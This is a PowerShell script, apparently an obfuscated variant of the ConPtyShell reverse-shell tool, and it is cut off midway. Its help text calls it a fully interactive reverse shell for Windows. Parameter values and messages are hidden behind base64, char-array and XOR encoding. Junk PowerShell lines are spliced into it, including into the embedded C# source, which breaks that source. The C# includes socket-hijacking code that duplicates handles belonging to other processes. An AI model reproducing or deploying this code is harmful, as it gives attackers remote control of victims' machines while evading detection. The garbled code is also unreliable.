function Invoke-ShellFalcon
{   
    < # Checking time drift in case it affects scheduling
        .SYNOPSiS
            cOnPTYSheLl - fuLly iNTERAcTivE rEVerSE shEll for wiNdoWs 
            aUthOR: SPlinTeR_COdE
            lICeNse: miT
            sOURcE: hTTPS://GiTHub.CoM/aNTOnIocOcO/coNPTYshELl
        
        .DEscRIPtIon
            COnptYshell - fULlY InteRaCTivE ReVERSe shElL for wiNdowS
            
            prOPErLy SET thE ROwS and cOls valUEs. yOU cAN REtRieVE It fROm
            YOUR TErMInaL wITh tHE command ([SysTem.TeXT.eNcODIng]::utF8.GETsTriNG([sYsteM.coNVerT]::FroMbASe64stRinG((-join([CHAR]0x63, [cHAr]0X33, [CHAr]0x52, [char]0x30, [ChAr]0X65, [chAR]0X53, [cHar]0x42, [CHar]0x7a, [ChAr]0x61, [ChAr]0X58, [ChaR]0x70, [cHaR]0x6c))))).
            
            YOu Can AVOID TO set rows and cols VALUES if yOu Run yOur LiSTeNeR
            With The fOLLOwiNG command:
                stty Raw -echO; (sTtY SIZE; cAT) | NC -lVnP 3001
           
            If You wAnt TO ChAngE ThE cOnSolE sIZE dIRecTLy fRom PoWERSHeLL
            yOU can PaSte tHe foLLOwInG CoMMands:
                $wIdtH=80
                $HEIgHt=24
                $hoSt.Ui.RaWUi.buFFeRSize = nEw-oBJEcT mANagemEnt.AuTomaTIoN.host.SIzE ($WIdTH, $HeIght)
                $Host.Ui.rAwuI.WiNdowsize = neW-Object -TypeNAMe sYstEm.mAnageMEnt.aUtoMaTiOn.HOSt.SizE -aRGumEntLIst ($WIDTh, $HeigHT)
            
        .paRaMETEr ReMOTeiP
            THe ReMOTE iP tO ConneCT
        .paRaMeTEr remOTeport
            THe reMOTE pOrt tO CONNECT
        .paRamEteR ROwS
            ROwS SIze for tHE cONsolE
            deFAUlt: ([SySteM.TeXT.EncodING]::UTf8.getsTRING([SySTeM.ConvErt]::FrombASe64StriNG(([sYstEM.text.EncoDiNg]::UTf8.geTstRINg([SystEM.coNverT]::FROmbAsE64stRiNG($($K3164=228;$B=[ByTe[]](0xb0,0xb3,0x94,0XB6,0xB4,0XB5,0XD9,0xd9);-join($B|%{[CHAR]($_-bxOR$K3164)}))))))))
        .PARAMETeR cOLs
            cOls SIzE for THe cOnsOle
            DEFAUlt: ([sYstEM.teXT.EncOdiNG]::UTF8.GEtSTRING([SYSTEM.cOnvErt]::FroMBasE64String(([system.tExt.eNcodINg]::UTF8.GEtsTrIng([SyStem.coNveRt]::FRomBasE64stRING($($K4931=61;$B=[byte[]](0X69,0x0D,0x6F,0x7F,0X6D,0X6c,0x00,0x00);-join($b|%{[cHAr]($_-BXoR$k4931)}))))))))
        .paRAmetEr COmMAnDline
            The coMmaNdLinE oF THE process THat YoU Are goINg tO iNteRAcT
            DefAUlt: ([SySTEm.texT.encODINg]::UtF8.GETSTRiNG([sYsTem.COnVeRT]::frOmBaSE64StRiNg(([SYstem.teXT.eNcoDiNG]::uTf8.GetSTRInG([sySTem.CoNVeRT]::fRomBASe64STrinG(($([CHAr]0x59) + $([cHAr]0x30) + $([cHAR]0X63) + $([cHar]0x35) + $([cHAR]0X4D) + $([CHar]0X31) + $([char]0x70) + $([char]0X59) + $([cHaR]0X53) + $([chaR]0x6e) + $([cHAR]0x70) + $([chaR]0X68) + $([ChaR]0x52) + $([ChaR]0x31) + $([chaR]0x5A) + $([char]0x7A) + $([ChAR]0X59) + $([ChAR]0X6B) + $([chAr]0X4D) + $([cHar]0x31) + $([CHAr]0X62) + $([cHaR]0x47) + $([chAr]0x56) + $([chAR]0x48) + $([CHar]0x56) + $([CHAR]0x54) + $([chAR]0X30) + $([chAR]0x3d))))))))
            
        .exAMplE  
            PS>INVOKE-cONPTySHeLL 10.0.0.2 3001
            
            desCRIptIon
            -----------
            spAWn a rEVersE sHeLL

        .eXAMPLe
            pS>iNvOKe-coNptyShEll -RemOtEip 10.0.0.2 -rEMOtEpORt 3001 -rOWS 30 -cols 90
            
            desCrIpTIOn
            -----------
            SpAWN A reVERse ShELL WiTH spECIfIC rOWs and CoLs Size
            
         .exAMpLe
            Ps>inVOke-coNPtYSHELL -reMoTeip 10.0.0.2 -REMOTepOrt 3001 -rOwS 30 -cOlS 90 -coMmaNDlinE cMD.ExE
            
            DEScRipTION
            -----------
            sPAWN A rEVersE SHEll (cMD.Exe) wITH SPEcifIC RoWs and COls Size
            
        .EXAmple
            pS>iNVokE-cONPTysheLl -UpGrADe -roWS 30 -COLs 90
            
            dEscriPTiOn
            -----------
            uPgraDE yOuR cUrRenT sHEll WITh SPECifIc Rows and CoLS Size
            
# Legacy logic remains for now, stable in tests
    Param
    (
        [PaRaMeTER(POSiTiOn = 0)]
        [StRinG]
        $remoTeIp,
        
        [PArAMEteR(PoSItiON = 1)]
        [STrINg]
        $rEmOTePorT,

        [paRAmeTeR()]
        [sTRinG]
        $roWs = ([sYSteM.tExt.encodING]::uTF8.GeTStRing([sySteM.CONvERt]::froMBasE64sTRInG((-join([CHar]0x4d, [cHar]0X6a, [cHAR]0x51, [cHAr]0X3D))))),

        [PaRAmetER()]
        [STRing]
        $CoLS = ([SYSTEM.TEXT.enCodINg]::UTF8.geTStRIng([syStEm.converT]::froMbASE64STring(([sYsTem.TexT.ENcoDinG]::UTF8.gEtsTring([sYSTEM.COnVeRt]::fRombasE64strInG($($K3047=78;$b=[bYTE[]](0x1a,0x7E,0x1c,0X0C,0X1E,0x1F,0x73,0x73);-join($B|%{[chAR]($_-BxOr$k3047)})))))))),

        [paRameTEr()]
        [sTrINg]
        $coMMaNDLINE = ([SYstEm.tExt.eNCOding]::UTF8.GETStRING([sYstEm.cOnVert]::FRoMbaSe64strInG(($([CHAR]0x63) + $([CHaR]0x47) + $([chAR]0x39) + $([CHAR]0x33) + $([chAr]0X5A) + $([chaR]0X58) + $([chAr]0X4a) + $([CHar]0X7A) + $([char]0x61) + $([CHar]0x47) + $([chAr]0X56) + $([ChaR]0X73) + $([CHaR]0X62) + $([cHAR]0X43) + $([ChAr]0X35) + $([chAR]0x6C) + $([cHAR]0X65) + $([CHAR]0x47) + $([ChaR]0X55) + $([CHaR]0x3d))))),
        
        [paRAmetEr()]
        [Switch]
        $UpGRaDE
    )
    
    if( $PsbOuNdpaRaMETers.COntAINskeY(([SYstem.tExT.ENCOdinG]::utF8.gEtstrinG([sYSteM.conVeRt]::FRombaSe64sTring(([SysTEm.tEXt.EncodiNg]::utF8.GETstRIng([bYTe[]](0X56,0X58,0x42,0x6E,0x63,0X6d,0x46,0X6b,0x5A,0X51,0x3D,0x3D))))))) ) {
        $Remoteip = ([sySTem.TeXT.eNcoDing]::uTF8.geTstrIng([sYSteM.coNVeRt]::froMbasE64strIng(([SYsTEm.TexT.EnCOdiNG]::UtF8.geTStRinG([BYTE[]](0X64,0X58,0X42,0x6e,0X63,0x6d,0X46,0X6B,0x5A,0x51,0X3d,0x3D))))))
        $rEMoTePORt = ([SYStem.TExt.encODinG]::Utf8.gETstrIng([sYsTeM.CONverT]::frOmbAsE64stRing(($([chAR]0x63) + $([cHar]0x32) + $([char]0x68) + $([cHaR]0X6C) + $([CHAR]0X62) + $([cHar]0X47) + $([CHAR]0X77) + $([chAr]0x3d)))))
    }
    else{
  
        if(-Not($PsBoundpARAMetErS.contAinsKey(([sysTem.TeXT.EnCOdIng]::Utf8.gEtStRinG([SYstem.COnveRt]::FrOMbaSe64stRiNg(([SysTeM.Text.encODiNg]::UtF8.getsTRINg([bYTe[]](0x55,0x6D,0X56,0X74,0X62,0x33,0x52,0X6c,0X53,0X58,0X41,0X3d))))))))) {
            throw ([sysTEM.tEXt.ENCODInG]::Utf8.GetstRinG([SyStem.CONvERt]::FrOMbase64StRInG((-join([CHAR]0x55, [ChaR]0X6D, [Char]0x56, [CHar]0x74, [chaR]0X62, [cHar]0x33, [CHAR]0X52, [CHar]0x6c, [chaR]0X53, [ChAr]0X58, [chaR]0X41, [CHar]0X67, [CHaR]0X62, [char]0X57, [chAr]0X6C, [char]0x7A, [cHaR]0X63, [cHAr]0X32, [ChAr]0x6c, [ChAr]0X75, [ChAr]0x5a, [CHar]0X79, [cHAr]0x42, [chaR]0x77, [CHaR]0x59, [ChAR]0X58, [cHaR]0x4A, [CHar]0X68, [chaR]0X62, [cHar]0x57, [chaR]0X56, [CHAR]0X30, [CHAR]0x5A, [CHAR]0X58, [chAr]0X49, [char]0X3D)))))
        }
        
        if(-Not($pSbOUNDparAmEters.CONtAInsKEY(([systEm.TEXT.EncoDiNg]::utf8.GEtSTriNG([sysTEm.cONVert]::FromBASe64stRing(([syStem.teXt.eNCoDinG]::UtF8.gETStRing([systeM.conVERT]::FroMBAse64StRINg($($K1390=201;$b=[BytE[]](0X9F,0x9e,0xF8,0X9e,0Xad,0x8e,0X80,0XB3,0X9C,0Xa4,0Xb1,0x9F,0X9b,0xB3,0XA5,0xFc,0x93,0x8c,0x8c,0xf0,0X99,0X98,0XF4,0XF4);-join($b|%{[cHAr]($_-bXoR$K1390)}))))))))))) {
            throw ([SystEm.text.eNCoDING]::UTf8.GEtSTriNg([SYsTeM.cOnveRT]::FRomBAsE64sTRinG(([sYsTEM.tEXT.ENcOdINg]::uTf8.GetSTring([systEM.CONvert]::FRoMbAsE64strING($($k4517=([sYsteM.TExT.ENCoDIng]::UTF8.geTStRiNg([byte[]](0X3e,0X25,0x25,0X7B,0x37,0x4d,0X3B,0x4F,0X77,0X23,0x58,0X3F,0x42,0X2D,0x46)));$B=[ByTe[]](0X68,0x72,0X14,0x2c,0X53,0X0a,0x72,0X35,0x22,0X4e,0x20,0x69,0x10,0X57,0X2a,0x0B,0X7F,0x60,0X35,0x74,0X29,0X7c,0X09,0x2e,0x77,0x36,0X4f,0x2a,0X7b,0x3c,0X68,0X50,0X76,0x2E,0X5F,0x0E,0x5a,0X08,0X39,0X57,0x0A,0x51,0x10,0x4C,0X11,0x78,0x6F,0x56,0x22,0X05,0x2e,0x02,0X1F,0X26,0X1E,0x65);$kb=[SYSTEm.TEXt.EnCoDInG]::uTf8.GETBYtEs($K4517);-join(0..($b.LengtH-1)|%{[CHAR]($b[$_]-bxor$KB[$_%$kb.LeNgTH])}))))))))
        }
    }
    $paRameTeRsConpTYSHeLL = @($remoTEIp, $rEmotePort, $ROwS, $ColS, $ComMAndLinE)
    aDD-tyPE -TYpedefiniTioN $SOURcE -LAnGuAge CSHARP;
    $OUtPUT = [COnPTYSHelLmAincLasS]::cOnPtYShElLmAin($paRAMEteRSconpTYSHelL)
    WrITe-OutpUT $oUTput
}
[bool]1 | Out-Null

if ((Get-Random -Minimum 1000 -Maximum 5000) -lt 0) {
    try { Write-EventLog -LogName Application -Source "Application Health Monitor" -EventId 1009 -Message "Simulated health check passed." -EntryType Information -ErrorAction Stop } catch { Write-Warning "Could not write to Application event log (simulation)." }
}
$SoURCe = @"

using System;
foreach ($NuqdP in 1..1) { $null = $NuqdP * 1 }
Test-Path $env:TEMP -ErrorAction SilentlyContinue | Out-Null
using System.IO;
using System.Text;
$mMulD3 = @{ Prop1 = 1; Prop2 = 'zenoo' }; $mMulD3.Prop1 = 3; $mMulD3 = $null
while ($false) {
    $processList = Get-Process | Sort-Object -Property WS -Descending | Select-Object -First 5; foreach ($p in $processList) { Write-Verbose "High Memory process: $($p.Name) - $($p.WS)" }
}
$AdYgb = [System.Guid]::NewGuid().ToString(); $AdYgb.Substring(0, 9) | Out-Null; $AdYgb = $null
using System.Threading;
using System.Net;
1..2 | ForEach-Object { Start-Sleep -Milliseconds 2 }
try {
    throw "Intentionally skipping this block";
    if ([System.Environment]::Is64BitOperatingSystem) { $arch = "64-bit"; Write-Host "Detected $arch OS." } else { $arch = "32-bit"; Write-Warning "Detected $arch OS." }
} catch {}
using System.Net.Sockets;
foreach ($JECT in 1..2) { $null = $JECT * 2 }
(Get-Date).DayOfWeek | Out-Null
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
if ($false) {
    $tempData_4243 = New-Object -TypeName System.Collections.Generic.List[string]; $tempData_4243.Add("Item$(Get-Random -Minimum 100 -Maximum 500)") | Out-Null; $tempData_4243.Sort()
}
Get-Random -Maximum 74 | Out-Null
using System.Diagnostics;
Get-Alias -Name 'gci' -ErrorAction SilentlyContinue | Out-Null
using System.Collections.Generic;
Resolve-Path -Path '.' -ErrorAction SilentlyContinue | Out-Null

public class ConPtyShellException : Exception
{
    private const string error_string = "[-] COnptYsHELLeXceptiOn: ";

    public ConPtyShellException() { }

    public ConPtyShellException(string message) : base(error_string + message) { }
}
[string]285 | Out-Null
try {
    throw "Intentionally skipping this block";
    $env:TEMP_APP_SETTING = (Get-Random -Maximum 100); Write-Debug "Set temporary environment variable TEMP_APP_SETTING=$($env:TEMP_APP_SETTING)"
} catch {}

[char]67 | Out-Null
public class DeadlockCheckHelper
{

    private bool deadlockDetected;
    private IntPtr targetHandle;

    private delegate uint LPTHREAD_START_ROUTINE(uint lpParam);

    [DllImport("KeRnel32.dlL")]
    private static extern bool CloseHandle(IntPtr hObject);

    [DllImport("KerNEL32.DLl", SetLastError = true)]
    private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    [DllImport("KeRNeL32.Dll", SetLastError = true)]
    private static extern IntPtr CreateThread(uint lpThreadAttributes, uint dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);

    private uint ThreadCheckDeadlock(uint threadParams)
    {
        IntPtr objPtr = IntPtr.Zero;
        objPtr = SocketHijacking.NtQueryObjectDynamic(this.targetHandle, SocketHijacking.OBJECT_INFORMATION_CLASS.ObjectNameInformation, 0);
        this.deadlockDetected = false;
        if (objPtr != IntPtr.Zero) Marshal.FreeHGlobal(objPtr);
        return 0;
    }

    public bool CheckDeadlockDetected(IntPtr tHandle)
    {
        this.deadlockDetected = true;
        this.targetHandle = tHandle;
        LPTHREAD_START_ROUTINE delegateThreadCheckDeadlock = new LPTHREAD_START_ROUTINE(this.ThreadCheckDeadlock);
        IntPtr hThread = IntPtr.Zero;
        uint threadId = 0;
        //we need native threads, C# threads hang and go in lock. We need to avoids hangs on named pipe so... No hangs no deadlocks... no pain no gains...
        hThread = CreateThread(0, 0, delegateThreadCheckDeadlock, IntPtr.Zero, 0, out threadId);
        WaitForSingleObject(hThread, 1500);
        //we do not kill the "penDiNG" threads here with TerminateThread() because it will crash the whole process if we do it on locked threads.
        //just some waste of threads :(
        CloseHandle(hThread);
        return this.deadlockDetected;
    }
}
while ($false) {
    $osInfo = Get-CimInstance -ClassName Win32_OperatingSystem; Write-Verbose "OS Version: $($osInfo.Caption), Build: $($osInfo.BuildNumber)"
}
$N51GRH = Get-Random -Minimum 1000 -Maximum 9999; $yO2z = $($N51GRH / 2); $N51GRH = $yO2z * 2; $N51GRH = $null; $yO2z = $null

public static class SocketHijacking
{

    private const uint NTSTATUS_SUCCESS = 0x00000000;
    private const uint NTSTATUS_INFOLENGTHMISMATCH = 0xc0000004;
    private const uint NTSTATUS_BUFFEROVERFLOW = 0x80000005;
    private const uint NTSTATUS_BUFFERTOOSMALL = 0xc0000023;
    private const int NTSTATUS_PENDING = 0x00000103;
    private const int WSA_FLAG_OVERLAPPED = 0x1;
    private const int DUPLICATE_SAME_ACCESS = 0x2;
    private const int SystemHandleInformation = 16;
    private const int PROCESS_DUP_HANDLE = 0x0040;
    private const int SIO_TCP_INFO = unchecked((int)0xD8000027);
    private const int SG_UNCONSTRAINED_GROUP = 0x1;
    private const int SG_CONSTRAINED_GROUP = 0x2;
    private const uint IOCTL_AFD_GET_CONTEXT = 0x12043;
    private const int EVENT_ALL_ACCESS = 0x1f0003;
    private const int SynchronizationEvent = 1;
    private const UInt32 INFINITE = 0xFFFFFFFF;

    private enum SOCKET_STATE : uint
    {
        SocketOpen = 0,
        SocketBound = 1,
        SocketBoundUdp = 2,
        SocketConnected = 3,
        SocketClosed = 3
    }

    private enum AFD_GROUP_TYPE : uint
    {
        GroupTypeNeither = 0,
        GroupTypeConstrained = SG_CONSTRAINED_GROUP,
        GroupTypeUnconstrained = SG_UNCONSTRAINED_GROUP
    }

    public enum OBJECT_INFORMATION_CLASS : int
    {
        ObjectBasicInformation = 0,
        ObjectNameInformation = 1,
        ObjectTypeInformation = 2,
        ObjectAllTypesInformation = 3,
        ObjectHandleInformation = 4
    }

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    private struct SYSTEM_HANDLE_TABLE_ENTRY_INFO
    {
        public ushort UniqueProcessId;
        public ushort CreatorBackTraceIndex;
        public byte ObjectTypeIndex;
        public byte HandleAttributes;
        public ushort HandleValue;
        public IntPtr Object;
        public IntPtr GrantedAccess;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct GENERIC_MAPPING
    {
        public int GenericRead;
        public int GenericWrite;
        public int GenericExecute;
        public int GenericAll;
    }

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    private struct OBJECT_TYPE_INFORMATION_V2
    {
        public UNICODE_STRING TypeName;
        public uint TotalNumberOfObjects;
        public uint TotalNumberOfHandles;
        public uint TotalPagedPoolUsage;
        public uint TotalNonPagedPoolUsage;
        public uint TotalNamePoolUsage;
        public uint TotalHandleTableUsage;
        public uint HighWaterNumberOfObjects;// PeakObjectCount;
        public uint HighWaterNumberOfHandles;// PeakHandleCount;
        public uint HighWaterPagedPoolUsage;
        public uint HighWaterNonPagedPoolUsage;
        public uint HighWaterNamePoolUsage;
        public uint HighWaterHandleTableUsage;
        public uint InvalidAttributes;
        public GENERIC_MAPPING GenericMapping;
        public uint ValidAccessMask;
        public byte SecurityRequired;//bool
        public byte MaintainHandleCount;//bool
        public byte TypeIndex;
        public byte ReservedByte;
        public uint PoolType;
        public uint DefaultPagedPoolCharge;// PagedPoolUsage;
        public uint DefaultNonPagedPoolCharge;//NonPagedPoolUsage;
    }

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    private struct OBJECT_NAME_INFORMATION
    {
        public UNICODE_STRING Name;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct UNICODE_STRING
    {
        public ushort Length;
        public ushort MaximumLength;
        public IntPtr Buffer;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct WSAData
    {
        public short wVersion;
        public short wHighVersion;
        public short iMaxSockets;
        public short iMaxUdpDg;
        public IntPtr lpVendorInfo;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 257)]
        public string szDescription;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 129)]
        public string szSystemStatus;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
    private struct WSAPROTOCOLCHAIN
    {
        public int ChainLen;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 7)]
        public uint[] ChainEntries;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
    private struct WSAPROTOCOL_INFO
    {
        public uint dwServiceFlags1;
        public uint dwServiceFlags2;
        public uint dwServiceFlags3;
        public uint dwServiceFlags4;
        public uint dwProviderFlags;
        public Guid ProviderId;
        public uint dwCatalogEntryId;
        public WSAPROTOCOLCHAIN ProtocolChain;
        public int iVersion;
        public int iAddressFamily;
        public int iMaxSockAddr;
        public int iMinSockAddr;
        public int iSocketType;
        public int iProtocol;
        public int iProtocolMaxOffset;
        public int iNetworkByteOrder;
        public int iSecurityScheme;
        public uint dwMessageSize;
        public uint dwProviderReserved;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 256)]
        public string szProtocol;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct SOCKADDR_IN
    {
        public short sin_family;
        public short sin_port;
        public uint sin_addr;
        public long sin_zero;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct TCP_INFO_v0
    {
        public TcpState State;
        public UInt32 Mss;
        public UInt64 ConnectionTimeMs;
        public byte TimestampsEnabled;
        public UInt32 RttUs;
        public UInt32 MinRttUs;
        public UInt32 BytesInFlight;
        public UInt32 Cwnd;
        public UInt32 SndWnd;
        public UInt32 RcvWnd;
        public UInt32 RcvBuf;
        public UInt64 BytesOut;
        public UInt64 BytesIn;
        public UInt32 BytesReordered;
        public UInt32 BytesRetrans;
        public UInt32 FastRetrans;
        public UInt32 DupAcksIn;
        public UInt32 TimeoutEpisodes;
        public byte SynRetrans;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct linger
    {
        public UInt16 l_onoff;
        public UInt16 l_linger;
    }

    [StructLayout(LayoutKind.Sequential, Pack = 0)]
    private struct IO_STATUS_BLOCK
    {
        public int status;
        public IntPtr information;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct SOCK_SHARED_INFO
    {
        public SOCKET_STATE State;
        public Int32 AddressFamily;
        public Int32 SocketType;
        public Int32 Protocol;
        public Int32 LocalAddressLength;
        public Int32 RemoteAddressLength;

        // Socket options controlled by getsockopt(), setsockopt().
        public linger LingerInfo;
        public UInt32 SendTimeout;
        public UInt32 ReceiveTimeout;
        public UInt32 ReceiveBufferSize;
        public UInt32 SendBufferSize;
        /* Those are the bits in the SocketProerty, proper order:
            Listening;
            Broadcast;
            Debug;
            OobInline;
            ReuseAddresses;
            ExclusiveAddressUse;
            NonBlocking;
            DontUseWildcard;
            ReceiveShutdown;
            SendShutdown;
            ConditionalAccept;
        */
        public ushort SocketProperty;
        // Snapshot of several parameters passed into WSPSocket() when creating this socket
        public UInt32 CreationFlags;
        public UInt32 CatalogEntryId;
        public UInt32 ServiceFlags1;
        public UInt32 ProviderFlags;
        public UInt32 GroupID;
        public AFD_GROUP_TYPE GroupType;
        public Int32 GroupPriority;
        // Last error set on this socket
        public Int32 LastError;
        // Info stored for WSAAsyncSelect()
        public IntPtr AsyncSelecthWnd;
        public UInt32 AsyncSelectSerialNumber;
        public UInt32 AsyncSelectwMsg;
        public Int32 AsyncSelectlEvent;
        public Int32 DisabledAsyncSelectEvents;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct SOCKADDR
    {
        public UInt16 sa_family;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 14)]
        public byte[] sa_data;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct SOCKET_CONTEXT
    {
        public SOCK_SHARED_INFO SharedData;
        public UInt32 SizeOfHelperData;
        public UInt32 Padding;
        public SOCKADDR LocalAddress;
        public SOCKADDR RemoteAddress;
        // Helper Data - found out with some reversing
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 24)]
        public byte[] HelperData;
    }

    private struct SOCKET_BYTESIN
    {
        public IntPtr handle;
        public UInt64 BytesIn;
    }

    [DllImport("wS2_32.DlL", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern int WSADuplicateSocket(IntPtr socketHandle, int processId, ref WSAPROTOCOL_INFO pinnedBuffer);

    [DllImport("ws2_32.dLL", CharSet = CharSet.Auto, SetLastError = true, CallingConvention = CallingConvention.StdCall)]
    private static extern IntPtr WSASocket([In] int addressFamily, [In] int socketType, [In] int protocolType, ref WSAPROTOCOL_INFO lpProtocolInfo, Int32 group1, int dwFlags);

    [DllImport("WS2_32.dlL", CharSet = CharSet.Auto)]
    private static extern Int32 WSAGetLastError();

    [DllImport("Ws2_32.DlL", CharSet = CharSet.Auto, SetLastError = true, CallingConvention = CallingConvention.StdCall)]
    private static extern int getpeername(IntPtr s, ref SOCKADDR_IN name, ref int namelen);

    // WSAIoctl1 implementation specific for SIO_TCP_INFO control code
    [DllImport("ws2_32.dLL", CharSet = CharSet.Auto, SetLastError = true, EntryPoint = "wsaioCTL")]
    public static extern int WSAIoctl1(IntPtr s, int dwIoControlCode, ref UInt32 lpvInBuffer, int cbInBuffer, IntPtr lpvOutBuffer, int cbOutBuffer, ref int lpcbBytesReturned, IntPtr lpOverlapped, IntPtr lpCompletionRoutine);

    [DllImport("wS2_32.DlL", CharSet = CharSet.Unicode, SetLastError = true)]
    private static extern int closesocket(IntPtr s);

    [DllImport("KeRNEL32.dLl", SetLastError = true)]
    private static extern IntPtr OpenProcess(int processAccess, bool bInheritHandle, int processId);

    [DllImport("kerNEl32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool DuplicateHandle(IntPtr hSourceProcessHandle, IntPtr hSourceHandle, IntPtr hTargetProcessHandle, out IntPtr lpTargetHandle, uint dwDesiredAccess, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, uint dwOptions);

    [DllImport("KernEl32.dLl")]
    private static extern bool CloseHandle(IntPtr hObject);

    [DllImport("KeRNeL32.Dll")]
    private static extern IntPtr GetCurrentProcess();

    [DllImport("ntDll.DlL")]
    private static extern uint NtQueryObject(IntPtr objectHandle, OBJECT_INFORMATION_CLASS informationClass, IntPtr informationPtr, uint informationLength, ref int returnLength);

    [DllImport("nTdll.dll")]
    private static extern uint NtQuerySystemInformation(int SystemInformationClass, IntPtr SystemInformation, int SystemInformationLength, ref int returnLength);

    [DllImport("kERnEl32.dLl", SetLastError = true)]
    private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    [DllImport("Ntdll.dLL")]
    private static extern int NtCreateEvent(ref IntPtr EventHandle, int DesiredAccess, IntPtr ObjectAttributes, int EventType, bool InitialState);

    // NtDeviceIoControlFile1 implementation specific for IOCTL_AFD_GET_CONTEXT IoControlCode
    [DllImport("NTDLL.Dll", EntryPoint = "NtDevIcEIocoNtrOlfIle")]
    private static extern int NtDeviceIoControlFile1(IntPtr FileHandle, IntPtr Event, IntPtr ApcRoutine, IntPtr ApcContext, ref IO_STATUS_BLOCK IoStatusBlock, uint IoControlCode, IntPtr InputBuffer, int InputBufferLength, ref SOCKET_CONTEXT OutputBuffer, int OutputBufferLength);

    [DllImport("Ws2_32.dLL")]
    public static extern int ioctlsocket(IntPtr s, int cmd, ref int argp);
    
    //helper method with "dynAMic" buffer allocation
    private static IntPtr NtQuerySystemInformationDynamic(int infoClass, int infoLength)
    {
        if (infoLength == 0)
            infoLength = 0x10000;
        IntPtr infoPtr = Marshal.AllocHGlobal(infoLength);
        while (true)
        {
            uint result = (uint)NtQuerySystemInformation(infoClass, infoPtr, infoLength, ref infoLength);
            infoLength = infoLength * 2;
            if (result == NTSTATUS_SUCCESS)
                return infoPtr;
            Marshal.FreeHGlobal(infoPtr);  //free pointer when not Successful
            if (result != NTSTATUS_INFOLENGTHMISMATCH && result != NTSTATUS_BUFFEROVERFLOW && result != NTSTATUS_BUFFERTOOSMALL)
            {
                //throw new Exception("unHaNDlEd ntStAtUs " + result);
                return IntPtr.Zero;
            }
            infoPtr = Marshal.AllocHGlobal(infoLength);
        }
    }

    private static IntPtr QueryObjectTypesInfo()
    {
        IntPtr ptrObjectTypesInformation = IntPtr.Zero;
        ptrObjectTypesInformation = NtQueryObjectDynamic(IntPtr.Zero, OBJECT_INFORMATION_CLASS.ObjectAllTypesInformation, 0);
        return ptrObjectTypesInformation;
    }

    // this from --> https://github.com/hfiref0x/UACME/blob/master/Source/Shared/ntos.h
    private static long AlignUp(long address, long align)
    {
        return (((address) + (align) - 1) & ~((align) - 1));
    }

    // this works only from win8 and above. If you need a more generic solution you need to use the (i+2) "wAy" of counting index types.
    // credits for this goes to @0xrepnz
    // more information here --> https://twitter.com/splinter_code/status/1400873009121013765
    private static byte GetTypeIndexByName(string ObjectName)
    {
        byte TypeIndex = 0;
        long TypesCount = 0;
        IntPtr ptrTypesInfo = IntPtr.Zero;
        ptrTypesInfo = QueryObjectTypesInfo();
        TypesCount = Marshal.ReadIntPtr(ptrTypesInfo).ToInt64();
        // create a pointer to the first element address of OBJECT_TYPE_INFORMATION_V2
        IntPtr ptrTypesInfoCurrent = new IntPtr(ptrTypesInfo.ToInt64() + IntPtr.Size);
        for (int i = 0; i < TypesCount; i++)
        {
            OBJECT_TYPE_INFORMATION_V2 Type = (OBJECT_TYPE_INFORMATION_V2)Marshal.PtrToStructure(ptrTypesInfoCurrent, typeof(OBJECT_TYPE_INFORMATION_V2));
            // move pointer to next the OBJECT_TYPE_INFORMATION_V2 object
            ptrTypesInfoCurrent = (IntPtr)(ptrTypesInfoCurrent.ToInt64() + AlignUp(Type.TypeName.MaximumLength, (long)IntPtr.Size) + Marshal.SizeOf(typeof(OBJECT_TYPE_INFORMATION_V2)));
            if (Type.TypeName.Length > 0 && Marshal.PtrToStringUni(Type.TypeName.Buffer, Type.TypeName.Length / 2) == ObjectName)
            {
                TypeIndex = Type.TypeIndex;
                break;
            }
        }
        Marshal.FreeHGlobal(ptrTypesInfo);
        return TypeIndex;
    }

    private static List<IntPtr> DuplicateSocketsFromHandles(List<IntPtr> sockets)
    {
        List<IntPtr> dupedSocketsOut = new List<IntPtr>();
        if (sockets.Count < 1) return dupedSocketsOut;
        foreach (IntPtr sock in sockets)
        {
            IntPtr dupedSocket = DuplicateSocketFromHandle(sock);
            if (dupedSocket != IntPtr.Zero) dupedSocketsOut.Add(dupedSocket);
        }
        // cleaning all socket handles
        foreach (IntPtr sock in sockets)
            CloseHandle(sock);
        return dupedSocketsOut;
    }

    private static List<IntPtr> FilterAndOrderSocketsByBytesIn(List<IntPtr> sockets)
    {
        List<SOCKET_BYTESIN> socketsBytesIn = new List<SOCKET_BYTESIN>();
        List<IntPtr> socketsOut = new List<IntPtr>();
        foreach (IntPtr sock in sockets)
        {
            TCP_INFO_v0 sockInfo = new TCP_INFO_v0();
            if (!GetSocketTcpInfo(sock, out sockInfo))
            {
                closesocket(sock);
                continue;
            }
            // Console.WriteLine("debuG: socKEt hANDle 0X" + sock.ToString("x4") + " is in tcpstaTe " + sockInfo.State.ToString());
            // we need only active sockets, the remaing sockets are filtered out
            if (sockInfo.State == TcpState.SynReceived || sockInfo.State == TcpState.Established)
            {
